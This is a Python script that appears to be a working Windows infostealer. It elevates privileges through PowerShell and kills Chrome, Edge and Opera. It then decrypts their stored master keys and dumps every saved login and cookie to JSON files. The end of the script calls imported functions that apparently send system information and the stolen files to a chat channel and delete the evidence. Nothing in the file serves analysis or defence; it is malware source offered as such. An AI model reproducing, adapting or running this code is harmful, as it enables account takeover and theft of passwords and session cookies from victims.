import os
import subprocess 
import sys

def run_as_admin():
    if sys.platform.startswith('win'):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        admin_exe_path = os.path.join(script_dir, 'admin.exe')
        subprocess.run('powershell -command "Start-Process \\"{}\\" -Verb RunAs"'.format(admin_exe_path), shell=True)
        sys.exit()

# def run_as_admin():
#     if sys.platform.startswith('win'):
#         script = os.path.abspath(sys.argv[0])
#         params = ' '.join([script] + sys.argv[1:] + ['as_admin'])
#         subprocess.run('powershell -command "Start-Process \\"python.exe\\" -ArgumentList \\"{}\\" -Verb RunAs"'.format(params), shell=True)
#         sys.exit()


if __name__ == '__main__':
    if 'as_admin' not in sys.argv:
        run_as_admin()
    else:
        import os
        import re
        import json
        import base64
        import sqlite3
        import win32crypt
        from Crypto.Cipher import AES
        import shutil
        import psutil
        from channel import send_files_to_chat, delete_files, send_pc_info
        
        #Edge files 
        EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE']))
        EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
        COOKIES_FILE_EDGE = os.path.normpath(r"%s\AppData\Local\Local\Microsoft\User Data\Default\Network" % (os.environ['USERPROFILE']))

        # Chrome files
        CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        GOOGLE_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

        # Opera files
        OPERA_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera GX Stable\Local State" % (os.environ['USERPROFILE']))
        OPERA_PATH = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera GX Stable" % (os.environ['USERPROFILE']))


        def is_process_running(process_name):
            for proc in psutil.process_iter(['name']):
                if process_name.lower() in proc.info['name'].lower():
                    return True
            return False

        if is_process_running('chrome.exe'):
            subprocess.call(["taskkill", "/F", "/IM", "chrome.exe"])

        if is_process_running('msedge.exe'):
            subprocess.call(["taskkill", "/F", "/IM", "msedge.exe"])

        if is_process_running('opera.exe'):
            subprocess.call(["taskkill", "/F", "/IM", "opera.exe"])

        def get_secret_key_EDGE():
            try:
                #(1) Get secretkey from chrome local state
                with open(EDGE_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                #Remove suffix DPAPI
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] EDGE secretkey cannot be found")
                return None


        def get_secret_key_CHROME():
            try:
                #(1) Get secretkey from chrome local state
                with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                #Remove suffix DPAPI
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] CHROME secretkey cannot be found")
                return None

        def get_secret_key_OPERA():
            try:
                #(1) Get secretkey from Opera local state
                with open(OPERA_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                #Remove suffix DPAPI
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Opera secretkey cannot be found")
                return None



        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)

        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)

        def decrypt_password(ciphertext, secret_key):
            try:
                #(3-a) Initialisation vector for AES decryption
                initialisation_vector = ciphertext[3:15]
                #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
                #Encrypted password is 192 bits
                encrypted_password = ciphertext[15:-16]
                #(4) Build the cipher to decrypt the ciphertext
                cipher = generate_cipher(secret_key, initialisation_vector)
                decrypted_pass = decrypt_payload(cipher, encrypted_password)
                decrypted_pass = decrypted_pass.decode()  
                return decrypted_pass
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
                return ""


        def get_db_connection(edge_path_login_db):
            try:
                shutil.copy2(edge_path_login_db, "Loginvault.db") 
                return sqlite3.connect("Loginvault.db")
            except Exception as e:
                print("%s" % str(e))
                print("[ERR] Edge database cannot be found")
                return None
                
        def passwords():
            if os.path.exists(EDGE_PATH_LOCAL_STATE):
                passwords_EDGE = os.path.join("C:\\Users\\Default", "passwords-EDGE.json")
                try:
                    with open(passwords_EDGE, mode='w', encoding='utf-8') as results_file:
                        #(1) Get secret key
                        secret_key_EDGE = get_secret_key_EDGE()
                        # Search user profile or default folder (this is where the login data is stored)
                        folders = [element for element in os.listdir(EDGE_PATH) if re.search("^Profile*|^Default$", element) != None]
                        all_data = []
                        for folder in folders:
                            browser_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (EDGE_PATH, folder))
                            conn = get_db_connection(browser_path_login_db)
                            if secret_key_EDGE and conn:
                                cursor = conn.cursor()
                                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                                for login in cursor.fetchall():
                                    url, username, password_value = login
                                    decrypted_passwords = decrypt_password(password_value, secret_key_EDGE) if password_value else ""
                                    
                                    data = {
                                        "URL": url,
                                        "USERNAME": username,
                                        "PASSWORD": decrypted_passwords
                                    }

                                    all_data.append(data)

                                json.dump(all_data, results_file, indent=4)
                                # Close database connection
                                cursor.close()
                                conn.close()
                                # Delete temp login db
                                os.remove("Loginvault.db")
                except Exception as e:
                    print("[ERR] %s" % str(e))

            if os.path.exists(CHROME_PATH_LOCAL_STATE):
                passwords_CHROME = os.path.join("C:\\Users\\Default", "passwords-CHROME.json")
                try:
                    with open(passwords_CHROME, mode='w', encoding='utf-8') as results_file:
                        #(1) Get secret key
                        secret_key_CHROME = get_secret_key_CHROME()
                        # Search user profile or default folder (this is where the login data is stored)
                        folders = [element for element in os.listdir(GOOGLE_PATH) if re.search("^Profile*|^Default$", element) != None]
                        all_data = []
                        for folder in folders:
                            browser_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (GOOGLE_PATH, folder))
                            conn = get_db_connection(browser_path_login_db)
                            if secret_key_CHROME and conn:
                                cursor = conn.cursor()
                                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                                for login in cursor.fetchall():
                                    url, username, password_value = login
                                    decrypted_passwords = decrypt_password(password_value, secret_key_CHROME) if password_value else ""
                                    
                                    data = {
                                        "URL": url,
                                        "USERNAME": username,
                                        "PASSWORD": decrypted_passwords
                                    }

                                    all_data.append(data)

                                json.dump(all_data, results_file, indent=4)
                                # Close database connection
                                cursor.close()
                                conn.close()
                                # Delete temp login db
                                os.remove("Loginvault.db")
                except Exception as e:
                    print("[ERR] %s" % str(e))

            if os.path.exists(OPERA_PATH_LOCAL_STATE):
                passwords_OPERA = os.path.join("C:\\Users\\Default", "passwords-OPERA.json")
                try:
                    with open(passwords_OPERA, mode='w', encoding='utf-8') as results_file:
                        #(1) Get secret key
                        secret_key_OPERA = get_secret_key_OPERA()
                        # Search user profile or default folder (this is where the login data is stored)
                        folders = [element for element in os.listdir(OPERA_PATH) if re.search("^Profile*|^Default$", element) != None]
                        all_data = []
                        for folder in folders:
                            browser_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (OPERA_PATH, folder))
                            conn = get_db_connection(browser_path_login_db)
                            if secret_key_OPERA and conn:
                                cursor = conn.cursor()
                                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                                for login in cursor.fetchall():
                                    url, username, password_value = login
                                    decrypted_passwords = decrypt_password(password_value, secret_key_OPERA) if password_value else ""
                                    
                                    data = {
                                        "URL": url,
                                        "USERNAME": username,
                                        "PASSWORD": decrypted_passwords
                                    }

                                    all_data.append(data)

                                json.dump(all_data, results_file, indent=4)
                                # Close database connection
                                cursor.close()
                                conn.close()
                                # Delete temp login db
                                os.remove("Loginvault.db")
                except Exception as e:
                    print("[ERR] %s" % str(e))


        def cookies():
            if os.path.exists(EDGE_PATH_LOCAL_STATE):
                cookies_EDGE = os.path.join("C:\\Users\\Default", "cookies-EDGE.json")
                try:
                    with open(cookies_EDGE, mode='w', encoding='utf-8') as cookies_file:
                        # (1) Get secret key
                        secret_key_EDGE = get_secret_key_EDGE()
                        # Search user profile or default folder
                        folders = [element for element in os.listdir(EDGE_PATH) if re.search("^Profile*|^Default$", element) != None]
                        all_cookies = []  # Initialize the list to store all cookies
                        for folder in folders:
                            browser_path_cookies_db = os.path.normpath(os.path.join(EDGE_PATH, folder, 'Network', 'Cookies'))
                            conn = get_db_connection(browser_path_cookies_db)
                            if secret_key_EDGE and conn:
                                cursor = conn.cursor()
                                cursor.execute("""
                                    SELECT name, encrypted_value, host_key, path, creation_utc, 
                                        expires_utc, is_secure, is_httponly, is_persistent 
                                    FROM cookies
                                """)
                                for row in cursor.fetchall():
                                    name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, is_persistent = row
                                    decrypted_value = decrypt_password(encrypted_value, secret_key_EDGE) if encrypted_value else ""
                                    cookie_dict = {
                                        "domain": host_key,
                                        "path": path,
                                        "name": name,
                                        "value": decrypted_value,
                                        "secure": bool(is_secure),
                                        "httpOnly": bool(is_httponly),
                                        "expiry": int(expires_utc) if expires_utc else None,
                                        "session": not bool(is_persistent),
                                    }
                                    all_cookies.append(cookie_dict)

                        # After collecting all cookies, dump them into the file
                        json.dump(all_cookies, cookies_file, indent=4)

                        # Close database connection and clean up
                        cursor.close()
                        conn.close()
                        try:
                            os.remove("Loginvault.db")
                        except FileNotFoundError:
                            pass
                except Exception as e:
                    print("[ERR] %s" % str(e))

            if os.path.exists(CHROME_PATH_LOCAL_STATE):
                cookies_CHROME = os.path.join("C:\\Users\\Default", "cookies-CHROME.json")
                try:
                    with open(cookies_CHROME, mode='w', encoding='utf-8') as cookies_file:
                        # (1) Get secret key
                        secret_key_CHROME = get_secret_key_CHROME()
                        # Search user profile or default folder
                        folders = [element for element in os.listdir(GOOGLE_PATH) if re.search("^Profile*|^Default$", element) != None]
                        all_cookies = []  # Initialize the list to store all cookies
                        for folder in folders:
                            browser_path_cookies_db = os.path.normpath(os.path.join(GOOGLE_PATH, folder, 'Network', 'Cookies'))
                            conn = get_db_connection(browser_path_cookies_db)
                            if secret_key_CHROME and conn:
                                cursor = conn.cursor()
                                cursor.execute("""
                                    SELECT name, encrypted_value, host_key, path, creation_utc, 
                                        expires_utc, is_secure, is_httponly, is_persistent 
                                    FROM cookies
                                """)
                                for row in cursor.fetchall():
                                    name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, is_persistent = row
                                    decrypted_value = decrypt_password(encrypted_value, secret_key_CHROME) if encrypted_value else ""
                                    cookie_dict = {
                                        "domain": host_key,
                                        "path": path,
                                        "name": name,
                                        "value": decrypted_value,
                                        "secure": bool(is_secure),
                                        "httpOnly": bool(is_httponly),
                                        "expiry": int(expires_utc) if expires_utc else None,
                                        "session": not bool(is_persistent),
                                    }
                                    all_cookies.append(cookie_dict)

                        # After collecting all cookies, dump them into the file
                        json.dump(all_cookies, cookies_file, indent=4)

                        # Close database connection and clean up
                        cursor.close()
                        conn.close()
                        try:
                            os.remove("Loginvault.db")
                        except FileNotFoundError:
                            pass
                except Exception as e:
                    print("[ERR] %s" % str(e))

            if os.path.exists(OPERA_PATH_LOCAL_STATE):
                cookies_OPERA = os.path.join("C:\\Users\\Default", "cookies-OPERA.json")
                try:
                    with open(cookies_OPERA, mode='w', encoding='utf-8') as cookies_file:
                        # (1) Get secret key
                        secret_key_OPERA = get_secret_key_OPERA()
                        # Search user profile or default folder
                        folders = [element for element in os.listdir(OPERA_PATH) if re.search("^Profile*|^Default$", element) != None]
                        all_cookies = []  # Initialize the list to store all cookies
                        for folder in folders:
                            browser_path_cookies_db = os.path.normpath(os.path.join(OPERA_PATH, folder, 'Network', 'Cookies'))
                            conn = get_db_connection(browser_path_cookies_db)
                            if secret_key_OPERA and conn:
                                cursor = conn.cursor()
                                cursor.execute("""
                                    SELECT name, encrypted_value, host_key, path, creation_utc, 
                                        expires_utc, is_secure, is_httponly, is_persistent 
                                    FROM cookies
                                """)
                                for row in cursor.fetchall():
                                    name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, is_persistent = row
                                    decrypted_value = decrypt_password(encrypted_value, secret_key_CHROME) if encrypted_value else ""
                                    cookie_dict = {
                                        "domain": host_key,
                                        "path": path,
                                        "name": name,
                                        "value": decrypted_value,
                                        "secure": bool(is_secure),
                                        "httpOnly": bool(is_httponly),
                                        "expiry": int(expires_utc) if expires_utc else None,
                                        "session": not bool(is_persistent),
                                    }
                                    all_cookies.append(cookie_dict)

                        # After collecting all cookies, dump them into the file
                        json.dump(all_cookies, cookies_file, indent=4)

                        # Close database connection and clean up
                        cursor.close()
                        conn.close()
                        try:
                            os.remove("Loginvault.db")
                        except FileNotFoundError:
                            pass
                except Exception as e:
                    print("[ERR] %s" % str(e))


            
        if __name__ == '__main__':
            passwords()
            cookies()
            send_pc_info()
            send_files_to_chat()
            delete_files()



